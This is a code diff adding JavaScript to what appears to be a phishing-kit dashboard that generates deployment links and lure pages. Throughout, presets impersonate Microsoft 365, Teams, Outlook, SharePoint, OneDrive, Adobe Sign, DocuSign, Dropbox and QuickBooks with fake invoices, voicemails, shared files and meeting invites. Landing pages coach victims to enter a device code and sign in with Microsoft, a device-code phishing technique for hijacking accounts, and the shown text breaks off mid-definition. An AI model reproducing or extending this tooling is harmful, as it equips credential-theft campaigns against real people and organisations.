+            'OneDrive': ['onedrive-doc', 'onedrive-share', 'onedrive-view', 'onedrive-files', 'onedrive-access'],
+            'OneDrive Share': ['onedrive-share', 'onedrive-doc', 'onedrive-view', 'onedrive-files'],
+            'Adobe': ['adobe-sign', 'adobe-review', 'adobe-document', 'adobe-pdf', 'adobe-secure'],
+            'Adobe Sign': ['adobe-sign', 'adobe-review', 'adobe-document', 'adobe-pdf'],
+            'DocuSign': ['docusign-review', 'docusign-sign', 'docusign-document', 'docusign-secure'],
+            'Dropbox': ['dropbox-share', 'dropbox-view', 'dropbox-docs', 'dropbox-transfer', 'dropbox-secure'],
+            'Dropbox Share': ['dropbox-share', 'dropbox-view', 'dropbox-docs', 'dropbox-transfer'],
+            'QuickBooks': ['qb-portal', 'qb-invoice', 'qb-accounting', 'qb-review', 'qb-secure'],
+            'Outlook': ['outlook-mail', 'outlook-sec', 'outlook-verify', 'outlook-protect', 'outlook-access'],
+            'SharePoint': ['sp-request', 'sp-library', 'sp-document', 'sp-shared', 'sp-portal'],
+            'SharePoint Request': ['sp-request', 'sp-library', 'sp-document', 'sp-shared'],
+            'Microsoft Teams': ['teams-invite', 'teams-meeting', 'teams-lobby', 'teams-join', 'teams-conference'],
+            'Teams Meeting Invitation': ['teams-invite', 'teams-meeting', 'teams-lobby', 'teams-join'],
+            'Cloud Voicemail': ['voice-portal', 'voicemail-audio', 'voice-message', 'voicemail-verify', 'voice-secure'],
+            'Azure MFA Prompt': ['azure-mfa', 'azure-verify', 'azure-auth', 'azure-identity'],
+            'None': ['direct-login', 'verify-portal', 'identity-check', 'auth-session']
+        };
+        let lgTemplateSlugIndex = {};
+
+        function toggleBgImageShow() {
+            toggleShow('lg-bg-image-show');
+            onFieldChange();
+        }
+
+        function resetBgImageToBlueprint() {
+            lgBgImageData = '/static/img/bg_blueprint.jpg';
+            const txt = document.getElementById('lg-bg-file-txt');
+            if (txt) txt.innerText = 'Blueprint Floor Plan (Default)';
+            const btn = document.getElementById('lg-bg-image-show');
+            if (btn) {
+                btn.dataset.visible = '1';
+                btn.innerText = 'Show';
+                btn.classList.add('active');
+                btn.classList.remove('hidden-state');
+            }
+            const slider = document.getElementById('lg-blur-slider');
+            if (slider) slider.value = 8;
+            const blurVal = document.getElementById('lg-blur-val');
+            if (blurVal) blurVal.innerText = '8%';
+            onFieldChange();
+        }
+
+        const LG_PRESETS = {
+            'Microsoft 365': {
+                type: 'document',
+                status_tag: 'Microsoft 365 · Protected Asset',
+                title: 'Protected Document',
+                desc: 'This file is protected by your organization\'s security policies, please verify your identity to access.',
+                doc_name: 'Financial-Report-2026.docx',
+                doc_badge: 'DOCX',
+                doc_meta: 'Cashflow Statement - 3.2 MB',
+                btn_label: 'Access Protected File',
+                btn_color: '#0078D4',
+                spin_color: '#0078D4',
+                foot1: 'Verify your identity to access this file',
+                foot2: 'End-to-end encrypted',
+                card_bg: '#ffffff',
+                page_color: '#ffffff',
+                landing_brand: 'Microsoft 365',
+                success_brand: 'Microsoft 365'
+            },
+            'Adobe': {
+                type: 'document',
+                status_tag: 'Adobe Sign · Verified Envelope',
+                title: 'Signature Requested',
+                desc: 'You have an agreement waiting for your electronic review and signature. Identity verification is required.',
+                doc_name: 'Non-Disclosure-Agreement.pdf',
+                doc_badge: 'PDF',
+                doc_meta: 'Adobe Acrobat Document · 1.8 MB',
+                btn_label: 'Review & Sign',
+                btn_color: '#FA0F00',
+                spin_color: '#FA0F00',
+                foot1: 'Sign in to Adobe Acrobat Sign to continue',
+                foot2: 'Adobe Sign · Legally binding & encrypted',
+                card_bg: '#ffffff',
+                page_color: '#f8f8f8',
+                landing_brand: 'Adobe',
+                success_brand: 'Adobe'
+            },
+            'Dropbox': {
+                type: 'document',
+                status_tag: 'Dropbox · Protected Transfer',
+                title: 'Dropbox File Shared',
+                desc: 'Someone shared a confidential file with you on Dropbox. Verify your identity to download or view.',
+                doc_name: 'Quarterly-Review-Deck.pptx',
+                doc_badge: 'PPTX',
+                doc_meta: 'Dropbox Cloud Transfer · 8.4 MB',
+                btn_label: 'View on Dropbox',
+                btn_color: '#0061FF',
+                spin_color: '#0061FF',
+                foot1: 'Sign in to access shared Dropbox file',
+                foot2: 'Dropbox Business Security · 256-bit AES',
+                card_bg: '#ffffff',
+                page_color: '#ffffff',
+                landing_brand: 'Dropbox',
+                success_brand: 'Dropbox'
+            },
+            'OneDrive': {
+                type: 'document',
+                status_tag: 'OneDrive · Shared Cloud File',
+                title: 'Protected Document Shared',
+                desc: 'A protected document has been shared with you via Microsoft OneDrive. Verify your identity to access.',
+                doc_name: 'Q3-Financial-Analysis.xlsx',
+                doc_badge: 'XLSX',
+                doc_meta: 'OneDrive file · 4.8 MB',
+                btn_label: 'Open in OneDrive',
+                btn_color: '#0078D4',
+                spin_color: '#0078D4',
+                foot1: 'Sign in with your organization account to view',
+                foot2: 'Microsoft OneDrive for Business · End-to-end encrypted',
+                card_bg: '#ffffff',
+                page_color: '#f3f2f1',
+                landing_brand: 'OneDrive',
+                success_brand: 'OneDrive'
+            },
+            'QuickBooks': {
+                type: 'document',
+                status_tag: 'QuickBooks · Verified Invoice',
+                title: 'Protected Invoice Review',
+                desc: 'An invoice or accounting transaction requires your identity verification to access.',
+                doc_name: 'Invoice-INV-2026-089.pdf',
+                doc_badge: 'PDF',
+                doc_meta: 'Intuit QuickBooks · Net 30 Terms',
+                btn_label: 'View & Pay Invoice',
+                btn_color: '#2CB34A',
+                spin_color: '#2CB34A',
+                foot1: 'Verify your identity to access accounting records',
+                foot2: 'Intuit QuickBooks Online Accounting · Bank-grade encryption',
+                card_bg: '#ffffff',
+                page_color: '#f5f5f5',
+                landing_brand: 'QuickBooks',
+                success_brand: 'QuickBooks'
+            },
+            'Outlook': {
+                type: 'outlook',
+                status_tag: 'Outlook · Encrypted Message',
+                title: 'Encrypted Message Received',
+                desc: 'You have received an encrypted message from your organization. Complete identity verification to decrypt and read this message.',
+                outlook_sender: 'Security Compliance Center <compliance@organization.com>',
+                outlook_subject: 'Confidential Employee Review & Retention Notice',
+                outlook_meta: 'TLS 1.3 Protected · Single-Use Decryption Token',
+                btn_label: 'Read Encrypted Message',
+                btn_color: '#0078D4',
+                spin_color: '#0078D4',
+                foot1: 'Protected by Microsoft Outlook Message Encryption (OME)',
+                foot2: 'Exchange Online Information Protection · End-to-end encrypted',
+                card_bg: '#ffffff',
+                page_color: '#f5f5f5',
+                landing_brand: 'Outlook',
+                success_brand: 'Outlook'
+            },
+            'DocuSign': {
+                type: 'document',
+                status_tag: 'DocuSign · Envelope Pending',
+                title: 'Document Ready for Signature',
+                desc: 'Please review and complete the signing process for the document shared with you via DocuSign.',
+                doc_name: 'Consulting-Service-Agreement.pdf',
+                doc_badge: 'PDF',
+                doc_meta: 'DocuSign Envelope · 3 pages',
+                btn_label: 'Review & Sign Document',
+                btn_color: '#21409A',
+                spin_color: '#21409A',
+                foot1: 'Sign in to DocuSign to continue',
+                foot2: 'DocuSign · Legally binding & encrypted',
+                card_bg: '#ffffff',
+                page_color: '#f8f9fa',
+                landing_brand: 'DocuSign',
+                success_brand: 'DocuSign'
+            },
+            'SharePoint': {
+                type: 'document',
+                status_tag: 'SharePoint · Organization Library',
+                title: 'SharePoint Document Access',
+                desc: 'You have been granted access to a protected document stored in your organization\'s SharePoint library.',
+                doc_name: 'Executive-Briefing-2026.docx',
+                doc_badge: 'DOCX',
+                doc_meta: 'SharePoint Online · 2.4 MB',
+                btn_label: 'Access Protected File',
+                btn_color: '#03787C',
+                spin_color: '#03787C',
+                foot1: 'Verify your identity to access this file',
+                foot2: 'SharePoint Online · Compliance & Retention Enforced',
+                card_bg: '#ffffff',
+                page_color: '#f3f2f1',
+                landing_brand: 'SharePoint',
+                success_brand: 'SharePoint'
+            },
+            'Microsoft Teams': {
+                type: 'teams',
+                status_tag: 'Lobby Open · Admission Required',
+                title: 'Join Microsoft Teams Meeting',
+                desc: 'You have been invited to join a secured Microsoft Teams video & audio meeting room. Identity verification is required to admit external participants to the virtual lobby.',
+                teams_topic: 'Q4 Executive Strategy & Security Review',
+                teams_organizer: 'David Vance (Senior VP Operations)',
+                teams_time: 'Today • Scheduled 45 mins',
+                teams_id: '942 810 4392',
+                teams_passcode: '649102',
+                teams_lobby: '4 colleagues currently waiting in lobby',
+                btn_label: 'Join Teams Meeting',
+                btn_color: '#5B5FC7',
+                spin_color: '#5B5FC7',
+                foot1: 'Protected by Microsoft Teams enterprise security policies',
+                foot2: 'End-to-end encrypted video & audio stream',
+                card_bg: '#ffffff',
+                page_color: '#f3f2f8',
+                landing_brand: 'Microsoft Teams',
+                success_brand: 'Microsoft Teams'
+            },
+            'Cloud Voicemail': {
+                type: 'voicemail',
+                status_tag: 'New Voicemail · Encrypted Recording',
+                title: 'New Encrypted Voicemail (0:48)',
+                desc: 'You have received a high-priority encrypted voice message. Verify your identity with your organizational account to decrypt the audio recording and play.',
+                vm_caller: '+1 (800) 419-7250 / Corporate Partner',
+                vm_time: 'Today, 11:24 AM (14 min ago)',
+                vm_duration: '0:48',
+                btn_label: '▶ Play Encrypted Voicemail',
+                btn_color: '#0078D4',
+                spin_color: '#0078D4',
+                foot1: 'Encrypted via Microsoft 365 Cloud Voicemail',
+                foot2: 'Protected voice transmission · Exchange Online',
+                card_bg: '#ffffff',
+                page_color: '#f2f6fa',
+                landing_brand: 'Cloud Voicemail',
+                success_brand: 'Cloud Voicemail'
+            }
+        };
+
+        async function initLinkGenerator() {
+            await syncDomainsDropdown();
+            onTemplateSelectChange();
+            loadDeploymentsTable();
+            updateUrlPreview();
+            updateLeftPanelControlsState();
+            setPreviewTab('preland');
+        }
+
+        function onTemplateSelectChange() {
+            const t = document.getElementById('lg-template-select')?.value || 'Microsoft 365';
+            const prevPrelandBtn = document.getElementById('btn-prev-preland');
+
+            if (t === 'None') {
+                if (prevPrelandBtn) {
+                    prevPrelandBtn.style.opacity = '0.35';
+                    prevPrelandBtn.title = 'Pre-landing is disabled for this deployment';
+                }
+                const pathInp = document.getElementById('lg-path');
+                if (pathInp && (!pathInp.value || pathInp.value === 'verify')) {
+                    pathInp.value = 'direct-login';
+                }
+                setPreviewTab('landing');
+                updatePreviewTitle();
+                return;
+            }
+
+            if (prevPrelandBtn) {
+                prevPrelandBtn.style.opacity = '1';
+                prevPrelandBtn.title = '';
+            }
+
+            const preset = LG_PRESETS[t] || LG_PRESETS['Microsoft 365'];
+            
+            // Common header & card inputs
+            if (document.getElementById('lg-status-tag')) document.getElementById('lg-status-tag').value = preset.status_tag || '';
+            if (document.getElementById('lg-title')) document.getElementById('lg-title').value = preset.title || '';
+            if (document.getElementById('lg-desc')) document.getElementById('lg-desc').value = preset.desc || '';
+            if (document.getElementById('lg-btn-label')) document.getElementById('lg-btn-label').value = preset.btn_label || '';
+            if (document.getElementById('lg-btn-color')) document.getElementById('lg-btn-color').value = preset.btn_color || '#0078D4';
+            if (document.getElementById('lg-spin-color')) document.getElementById('lg-spin-color').value = preset.spin_color || '#0078D4';
+            if (document.getElementById('lg-foot1')) document.getElementById('lg-foot1').value = preset.foot1 || '';
+            if (document.getElementById('lg-foot2')) document.getElementById('lg-foot2').value = preset.foot2 || '';
+            if (document.getElementById('lg-card-bg')) document.getElementById('lg-card-bg').value = preset.card_bg || '#ffffff';
+            if (document.getElementById('lg-page-color')) document.getElementById('lg-page-color').value = preset.page_color || '#ffffff';
+
+            // Toggle template-specific content input groups
+            const docGrp = document.getElementById('preland-group-document');
+            const outlookGrp = document.getElementById('preland-group-outlook');
+            const teamsGrp = document.getElementById('preland-group-teams');
+            const vmGrp = document.getElementById('preland-group-voicemail');
+
+            const pType = preset.type || 'document';
+            if (docGrp) docGrp.style.display = (pType === 'document') ? 'block' : 'none';
+            if (outlookGrp) outlookGrp.style.display = (pType === 'outlook') ? 'block' : 'none';
+            if (teamsGrp) teamsGrp.style.display = (pType === 'teams') ? 'block' : 'none';
+            if (vmGrp) vmGrp.style.display = (pType === 'voicemail') ? 'block' : 'none';
+
+            // Populate the active group's inputs
+            if (pType === 'outlook') {
+                if (document.getElementById('lg-outlook-sender')) document.getElementById('lg-outlook-sender').value = preset.outlook_sender || '';
+                if (document.getElementById('lg-outlook-subject')) document.getElementById('lg-outlook-subject').value = preset.outlook_subject || '';
+                if (document.getElementById('lg-outlook-meta')) document.getElementById('lg-outlook-meta').value = preset.outlook_meta || '';
+            } else if (pType === 'teams') {
+                if (document.getElementById('lg-teams-topic')) document.getElementById('lg-teams-topic').value = preset.teams_topic || '';
+                if (document.getElementById('lg-teams-organizer')) document.getElementById('lg-teams-organizer').value = preset.teams_organizer || '';
+                if (document.getElementById('lg-teams-time')) document.getElementById('lg-teams-time').value = preset.teams_time || '';
+                if (document.getElementById('lg-teams-id')) document.getElementById('lg-teams-id').value = preset.teams_id || '';
+                if (document.getElementById('lg-teams-passcode')) document.getElementById('lg-teams-passcode').value = preset.teams_passcode || '';
+                if (document.getElementById('lg-teams-lobby')) document.getElementById('lg-teams-lobby').value = preset.teams_lobby || '';
+            } else if (pType === 'voicemail') {
+                if (document.getElementById('lg-vm-caller')) document.getElementById('lg-vm-caller').value = preset.vm_caller || '';
+                if (document.getElementById('lg-vm-time')) document.getElementById('lg-vm-time').value = preset.vm_time || '';
+                if (document.getElementById('lg-vm-duration')) document.getElementById('lg-vm-duration').value = preset.vm_duration || '';
+            } else {
+                if (document.getElementById('lg-doc-name')) document.getElementById('lg-doc-name').value = preset.doc_name || '';
+                if (document.getElementById('lg-doc-badge')) document.getElementById('lg-doc-badge').value = preset.doc_badge || '';
+                if (document.getElementById('lg-doc-meta')) document.getElementById('lg-doc-meta').value = preset.doc_meta || '';
+            }
+
+            // Auto-synchronize Landing & Success templates with Pre-land WITHOUT hijacking preview tab
+            if (document.getElementById('lg-landing-template')) {
+                document.getElementById('lg-landing-template').value = preset.landing_brand || t;
+                onLandingTemplateChange(false);
+            }
+            if (document.getElementById('lg-success-template')) {
+                document.getElementById('lg-success-template').value = preset.success_brand || t;
+                onSuccessTemplateChange(false);
+            }
+
+            // Auto-update path slug dynamically per template (professional text slugs, NO numbers)
+            const pathInp = document.getElementById('lg-path');
+            if (pathInp && !lgPathUserCustomized) {
+                const list = LG_TEMPLATE_SLUGS[t] || [t.toLowerCase().replace(/[^a-z0-9]+/g, '-')];
+                pathInp.value = list[0] || 'verify';
+            }
+
+            setPreviewTab('preland');
+            onFieldChange();
+        }
+
+        function resetCustomizations() {
+            onTemplateSelectChange();
+            showToast('All customizations reset to template defaults');
+        }
+
+        function resetBtnColor() {
+            const t = document.getElementById('lg-template-select')?.value || 'DocuSign';
+            const preset = LG_PRESETS[t] || LG_PRESETS['DocuSign'];
+            document.getElementById('lg-btn-color').value = preset.btn_color;
+            onFieldChange();
+        }
+
+        function toggleAccordion(id) {
+            const target = document.getElementById(id);
+            if (!target) return;
+            const wasCollapsed = target.classList.contains('collapsed');
+
+            // Collapse all 3 accordions
+            ['lg-preland-body', 'lg-landing-body', 'lg-success-body'].forEach(accId => {
+                const el = document.getElementById(accId);
+                if (el) el.classList.add('collapsed');
+            });
+
+            // Expand clicked accordion if it was collapsed, and sync preview pane
+            if (wasCollapsed) {
+                target.classList.remove('collapsed');
+                if (id === 'lg-preland-body') setPreviewTab('preland');
+                else if (id === 'lg-landing-body') setPreviewTab('landing');
+                else if (id === 'lg-success-body') setPreviewTab('success');
+            }
+        }
+
+        function toggleShow(btnId) {
+            const btn = document.getElementById(btnId);
+            if (!btn) return;
+            const isVis = btn.dataset.visible === '1';
+            btn.dataset.visible = isVis ? '0' : '1';
+            btn.innerText = isVis ? 'Hide' : 'Show';
+            btn.classList.toggle('active', !isVis);
+            btn.classList.toggle('hidden-state', isVis);
+
+            // Context-aware refresh without jumping preview tab
+            if (btnId.startsWith('lg-show-land-') || btnId.includes('land')) {
+                onLandingFieldChange(true);
+            } else if (btnId.includes('success')) {
+                onSuccessFieldChange(true);
+            } else {
+                onFieldChange();
+            }
+        }
+
+        let lgLandingLogoData = null;
+        let lgLandingLeftBgData = null;
+        let lgLandingPageBgData = '/static/img/bg_blueprint.jpg';
+        let lgLandingCardBgData = null;
+        let lgLandingCodeBgData = null;
+        let lgLandingStepsBgData = null;
+
+        function toggleLandBgImageShow() {
+            toggleShow('lg-land-bg-image-show');
+            onLandingFieldChange();
+        }
+
+        function resetLandBgToBlueprint() {
+            lgLandingPageBgData = '/static/img/bg_blueprint.jpg';
+            const txt = document.getElementById('lg-land-page-bg-txt');
+            if (txt) txt.innerText = 'Blueprint Floor Plan (Default)';
+            const btn = document.getElementById('lg-land-bg-image-show');
+            if (btn) {
+                btn.dataset.visible = '1';
+                btn.innerText = 'Show';
+                btn.classList.add('active');
+                btn.classList.remove('hidden-state');
+            }
+            const slider = document.getElementById('lg-land-blur');
+            if (slider) slider.value = 8;
+            const blurNum = document.getElementById('lg-land-blur-num');
+            if (blurNum) blurNum.innerText = '8%';
+            onLandingFieldChange();
+        }
+
+        const LG_LANDING_PRESETS = {
+            'Adobe': {
+                left_title: 'Adobe',
+                left_desc: 'Document awaiting your signature.',
+                left_color: '#FA0F00',
+                title: 'Sign Document',
+                desc: 'Sign in with your Microsoft account to verify your identity and complete the signing process.',
+                doc_name: 'Service-Agreement.pdf',
+                doc_badge: 'PDF',
+                doc_meta: 'Adobe Acrobat Document · Awaiting signature',
+                verify_head: 'Verify your identity',
+                verify_desc: 'To review this sign-in activity, complete the verification steps below.',
+                steps_head: 'Steps to secure:',
+                steps_text: '1. Click the button below to open the sign-in window.\n2. Enter the code {CODE} when prompted.\n3. Authenticate with your Microsoft account.\n4. Return to this tab to review the activity.',
+                copy_label: 'Copy code',
+                signin_label: 'Sign in with Microsoft',
+                copy_color: '#FA0F00',
+                signin_color: '#000000',
+                page_bg: '#f5f5f5',
+                card_bg: '#ffffff',
+                code_bg: '#ffffff',
+                steps_bg: '#fbfbfb',
+                footer: ''
+            },
+            'Dropbox': {
+                left_title: 'Dropbox',
+                left_desc: 'Shared files awaiting access.',
+                left_color: '#0061FE',
+                title: 'Shared folder access',
+                desc: 'Sign in with your Microsoft account to view and download shared Dropbox files.',
+                doc_name: 'Quarterly-Deliverables.zip',
+                doc_badge: 'ZIP',
+                doc_meta: 'Dropbox Shared Folder · 14.8 MB',
+                verify_head: 'Verify your identity',
+                verify_desc: 'To access these shared files, complete verification below.',
+                steps_head: 'STEPS TO ACCESS:',
+                steps_text: '1. Click the button below to open the sign-in window.\n2. Enter the code {CODE} when prompted.\n3. Authenticate with your Microsoft account.\n4. Return to this tab to download.',
+                copy_label: 'Copy code',
+                signin_label: 'Sign in with Microsoft',
+                copy_color: '#0061FE',
+                signin_color: '#000000',
+                page_bg: '#f7f9fa',
+                card_bg: '#ffffff',
+                code_bg: '#ffffff',
+                steps_bg: '#f7f9fa',
+                footer: ''
+            },
+            'OneDrive': {
+                left_title: 'OneDrive',
+                left_desc: 'Protected cloud document.',
+                left_color: '#0078D4',
+                title: 'Protected Document',
+                desc: 'This file is protected by your organization\'s security policies. Verify your identity to access this.',
+                doc_name: 'Shared-File.docx',
+                doc_badge: 'DOCX',
+                doc_meta: 'OneDrive file · Access required',
+                verify_head: 'Verify your identity',
+                verify_desc: 'To access this file please follow the steps below.',
+                steps_head: 'STEPS TO ACCESS:',
+                steps_text: '1. Click the button below to open the sign-in window.\n2. Enter the code {CODE} when prompted.\n3. Authenticate with your Microsoft account.\n4. Return to this tab to access the document.',
+                copy_label: 'Copy code',
+                signin_label: 'Sign in with Microsoft',
+                copy_color: '#0078D4',
+                signin_color: '#000000',
+                page_bg: '#f3f2f1',
+                card_bg: '#ffffff',
+                code_bg: '#f7f8fa',
+                steps_bg: '#ffffff',
+                footer: ''
+            },
+            'QuickBooks': {
+                left_title: 'QuickBooks',
+                left_desc: 'Invoice awaiting verification.',
+                left_color: '#2CB34A',
+                title: 'Verify your Identity',
+                desc: 'To authorize this payment, verify your identity below.',
+                doc_name: 'Invoice-2026-1047.pdf',
+                doc_badge: 'PDF',
+                doc_meta: 'Protected invoice · Intuit Inc.',
+                verify_head: 'Verify your identity',
+                verify_desc: 'To complete verification follow the steps below.',
+                steps_head: 'STEPS TO VERIFY:',
+                steps_text: '1. Click the button below to open the sign-in window.\n2. Enter the code {CODE} when prompted.\n3. Authenticate with your Microsoft account.\n4. Return to this tab to review the invoice.',
+                copy_label: 'Copy code',
+                signin_label: 'Sign in with Microsoft',
+                copy_color: '#2CB34A',
+                signin_color: '#000000',
+                page_bg: '#f5f5f5',
+                card_bg: '#ffffff',
+                code_bg: '#ffffff',
+                steps_bg: '#fafafa',
+                footer: ''
+            },
+            'Outlook': {
+                left_title: 'Outlook',
+                left_desc: 'Protected message access.',
+                left_color: '#0078D4',
+                title: 'Protected Document',
+                desc: 'This document requires authentication before viewing.',
+                doc_name: 'Encrypted-Message.eml',
+                doc_badge: 'EML',
+                doc_meta: 'Microsoft 365 Encrypted Message',
+                verify_head: 'Verify your identity',
+                verify_desc: 'To decrypt this message follow the steps below.',
+                steps_head: 'STEPS TO DECRYPT:',
+                steps_text: '1. Click the button below to open the sign-in window.\n2. Enter the code {CODE} when prompted.\n3. Authenticate with your Microsoft account.\n4. Return to this tab to read the message.',
+                copy_label: 'Copy code',
+                signin_label: 'Sign in with Microsoft',
+                copy_color: '#0078D4',
+                signin_color: '#000000',
+                page_bg: '#f5f5f5',
+                card_bg: '#ffffff',
+                code_bg: '#ffffff',
+                steps_bg: '#f7f8fa',
+                footer: ''
+            },
+            'Microsoft 365': {
+                left_title: 'Microsoft 365',
+                left_desc: 'Protected organizational document.',
+                left_color: '#0078D4',
+                title: 'Sign in to your account',
+                desc: 'Enter the code displayed on your device or application to sign in.',
+                doc_name: 'Security-Verification.pdf',
+                doc_badge: 'M365',
+                doc_meta: 'Microsoft 365 Security Check',
+                verify_head: 'Verify your identity',
+                verify_desc: 'Complete the verification steps below.',
+                steps_head: 'STEPS TO SIGN IN:',
+                steps_text: '1. Click the button below to open the sign-in window.\n2. Enter the code {CODE} when prompted.\n3. Authenticate with your Microsoft account.\n4. Return to this tab.',
+                copy_label: 'Copy code',
+                signin_label: 'Sign in with Microsoft',
+                copy_color: '#0078D4',
+                signin_color: '#000000',
+                page_bg: '#f3f2f1',
+                card_bg: '#ffffff',
+                code_bg: '#ffffff',
+                steps_bg: '#fbfbfb',
+                footer: ''
+            },
+            'DocuSign': {
+                left_title: 'DocuSign',
+                left_desc: 'Electronic signature requested.',
+                left_color: '#21409A',
+                title: 'Review & Sign Document',
+                desc: 'Sign in with your Microsoft account to verify your identity and complete the signing process.',
+                doc_name: 'Agreement-Sign.pdf',
+                doc_badge: 'PDF',
+                doc_meta: 'DocuSign Document · Awaiting signature',
+                verify_head: 'Verify your identity',
+                verify_desc: 'To complete the signing process, authenticate below.',
+                steps_head: 'STEPS TO SIGN:',
+                steps_text: '1. Click the button below to open the sign-in window.\n2. Enter the code {CODE} when prompted.\n3. Authenticate with your Microsoft account.\n4. Return to this tab to complete signing.',
+                copy_label: 'Copy code',
+                signin_label: 'Sign in with Microsoft',
+                copy_color: '#21409A',
+                signin_color: '#000000',
+                page_bg: '#f8f9fa',
+                card_bg: '#ffffff',
+                code_bg: '#ffffff',
+                steps_bg: '#fbfbfb',
+                footer: ''
+            },
+            'SharePoint': {
+                left_title: 'SharePoint',
+                left_desc: 'Shared workspace access.',
+                left_color: '#03787C',
+                title: 'SharePoint Document Access',
+                desc: 'Sign in with your Microsoft account to verify your identity and access this protected file.',
+                doc_name: 'Confidential-SharePoint-Doc.docx',
+                doc_badge: 'DOCX',
+                doc_meta: 'SharePoint Online Document',
+                verify_head: 'Verify your identity',
+                verify_desc: 'To access this file please follow the steps below.',
+                steps_head: 'STEPS TO ACCESS:',
+                steps_text: '1. Click the button below to open the sign-in window.\n2. Enter the code {CODE} when prompted.\n3. Authenticate with your Microsoft account.\n4. Return to this tab to access the document.',
+                copy_label: 'Copy code',
+                signin_label: 'Sign in with Microsoft',
+                copy_color: '#03787C',
+                signin_color: '#000000',
+                page_bg: '#f3f2f1',
+                card_bg: '#ffffff',
+                code_bg: '#f7f8fa',
+                steps_bg: '#ffffff',
+                footer: ''
+            },
+            'Microsoft Teams': {
+                left_title: 'Microsoft Teams',
+                left_desc: 'Scheduled Virtual Conference Lobby. Authentication required before admission.',
+                left_color: '#5B5FC7',
+                title: 'Sign in to Join Meeting Room',
+                desc: 'Sign in with your Microsoft account to authenticate and enter the virtual meeting lobby.',
+                doc_name: 'Teams-Meeting-Invitation.ics',
+                doc_badge: 'ICS',
+                doc_meta: 'Scheduled Meeting Room · Lobby access required',
+                verify_head: 'Verify your identity',
+                verify_desc: 'To access the meeting room, complete authentication below.',
+                steps_head: 'STEPS TO JOIN MEETING:',
+                steps_text: '1. Click the button below to open Microsoft authentication.\n2. Enter code {CODE} when prompted.\n3. Sign in with your Microsoft organization account.\n4. Return to this tab to be automatically admitted to the meeting room.',
+                copy_label: 'Copy code',
+                signin_label: 'Sign in with Microsoft',
+                copy_color: '#5B5FC7',
+                signin_color: '#000000',
+                page_bg: '#f3f2f8',
+                card_bg: '#ffffff',
+                code_bg: '#f5f5fc',
+                steps_bg: '#ffffff',
+                footer: ''
+            },
+            'Cloud Voicemail': {
+                left_title: 'Cloud Voicemail',
+                left_desc: 'Exchange Online Audio Decryption Service. Compliance verification required.',
+                left_color: '#0078D4',
+                title: 'Decrypt Audio Voice Message',
+                desc: 'Authenticate with your Microsoft account to decrypt audio and stream the voicemail message.',
+                doc_name: 'Voicemail-External-(0m48s).wav',
+                doc_badge: 'WAV',
+                doc_meta: 'Exchange Cloud Voicemail · Decryption required',
+                verify_head: 'Verify your identity',
+                verify_desc: 'To decrypt and play audio recording, complete authentication below.',
+                steps_head: 'STEPS TO DECRYPT AUDIO:',
+                steps_text: '1. Click the button below to open Microsoft authentication.\n2. Enter code {CODE} when prompted.\n3. Sign in with your Microsoft organization account.\n4. Return to this tab to stream audio recording.',
+                copy_label: 'Copy code',
+                signin_label: 'Sign in with Microsoft',
+                copy_color: '#0078D4',
+                signin_color: '#000000',
+                page_bg: '#f2f6fa',
+                card_bg: '#ffffff',
+                code_bg: '#f0f4f9',
+                steps_bg: '#ffffff',
+                footer: ''
+            }
+        };
+
+        let lgSuccessLogoData = null;
+        let lgSuccessBannerData = null;
+        let lgSuccessPageBgData = null;
+        let lgSuccessCardBgData = null;
+
+        const LG_SUCCESS_PRESETS = {
+            'Dropbox': {
+                header_color: '#ffffff',
+                page_title: 'Dropbox - Shared folder access',
+                card_title: 'Shared folder access',
+                service_name: 'Dropbox',
+                page_bg: '#ffffff',
+                card_bg: '#ffffff',
+                body_card_bg: '#fdfbf7',
+                body_text: 'Thanks for verifying your identity. You will be redirected to Microsoft 365 shortly.',
+                footer_text: '',
+                redirect_sec: 5
+            },
+            'Adobe': {
+                header_color: '#ffffff',
+                page_title: 'Adobe Acrobat - Access granted',
+                card_title: 'Document access verified',
+                service_name: 'Adobe Acrobat',
+                page_bg: '#ffffff',
+                card_bg: '#ffffff',
+                body_card_bg: '#fafafa',
+                body_text: 'Your signature and identity have been verified. You will be redirected shortly.',
+                footer_text: '',
+                redirect_sec: 5
+            },
+            'OneDrive': {
+                header_color: '#ffffff',
+                page_title: 'OneDrive - Verification Complete',
+                card_title: 'Shared document access',
+                service_name: 'OneDrive',
+                page_bg: '#f3f2f1',
+                card_bg: '#ffffff',
+                body_card_bg: '#f8f9fa',
+                body_text: 'Thanks for verifying your identity. You will be redirected shortly.',
+                footer_text: '',
+                redirect_sec: 5
+            },
+            'QuickBooks': {
+                header_color: '#ffffff',
+                page_title: 'QuickBooks - Payment Authorized',
+                card_title: 'Payment Authorization Complete',
+                service_name: 'QuickBooks',
+                page_bg: '#f5f5f5',
+                card_bg: '#ffffff',
+                body_card_bg: '#f7faf7',
+                body_text: 'Your identity has been verified and payment authorized. Redirecting shortly.',
+                footer_text: '',
+                redirect_sec: 5
+            },
+            'Outlook': {
+                header_color: '#ffffff',
+                page_title: 'Outlook - Encrypted Message Decrypted',
+                card_title: 'Encrypted Message Access',
+                service_name: 'Outlook',
+                page_bg: '#f3f2f1',
+                card_bg: '#ffffff',
+                body_card_bg: '#f8f9fa',
+                body_text: 'Identity verified. You will be redirected to your decrypted message shortly.',
+                footer_text: '',
+                redirect_sec: 5
+            },
+            'Microsoft 365': {
+                header_color: '#ffffff',
+                page_title: 'Microsoft 365 - Verification Successful',
+                card_title: 'Authentication Successful',
+                service_name: 'Microsoft 365',
+                page_bg: '#f3f2f1',
+                card_bg: '#ffffff',
+                body_card_bg: '#f8f9fa',
+                body_text: 'Thanks for verifying your identity. You will be redirected to Microsoft 365 shortly.',
+                footer_text: '',
+                redirect_sec: 5
+            },
+            'DocuSign': {
+                header_color: '#ffffff',
+                page_title: 'DocuSign - Document Access Granted',
+                card_title: 'Document access verified',
+                service_name: 'DocuSign',
+                page_bg: '#f8f9fa',
+                card_bg: '#ffffff',
+                body_card_bg: '#fafafa',
+                body_text: 'Your identity and signature authorization have been verified. You will be redirected shortly.',
+                footer_text: '',
+                redirect_sec: 5
+            },
+            'SharePoint': {
+                header_color: '#ffffff',
+                page_title: 'SharePoint - Verification Complete',
+                card_title: 'SharePoint Access Granted',
+                service_name: 'Microsoft SharePoint',
+                page_bg: '#f3f2f1',
+                card_bg: '#ffffff',
+                body_card_bg: '#f8f9fa',
+                body_text: 'Thanks for verifying your identity. You will be redirected to SharePoint shortly.',
+                footer_text: '',
+                redirect_sec: 5
+            },
+            'Microsoft Teams': {
+                header_color: '#ffffff',
+                page_title: 'Microsoft Teams - Lobby Access Authorized',
+                card_title: 'Lobby Access Authorized',
+                service_name: 'Microsoft Teams',
+                page_bg: '#f3f2f8',
